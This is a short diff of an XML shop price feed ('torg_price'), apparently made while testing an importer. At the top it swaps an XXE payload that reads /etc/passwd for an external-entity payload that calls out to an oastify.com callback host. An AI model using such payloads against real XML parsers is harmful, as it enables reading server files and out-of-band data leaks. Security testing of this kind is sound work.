@@ -1,5 +1,7 @@
 <?xml version="1.0"?>
-<!DOCTYPE foo [ <!ELEMENT foo (#ANY)> <!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>
+<!DOCTYPE lolz [
+<!ENTITY test SYSTEM "http://uombdrxvfwlbqsiju7tu9viho8u0iu6j.oastify.com/entity1.xml">]>
+<lolz><lol>3..2..1...&test<lol></lolz>
 <torg_price date="2018-01-01 00:01">
 <shop>
     <name>Интернет-магазин</name>
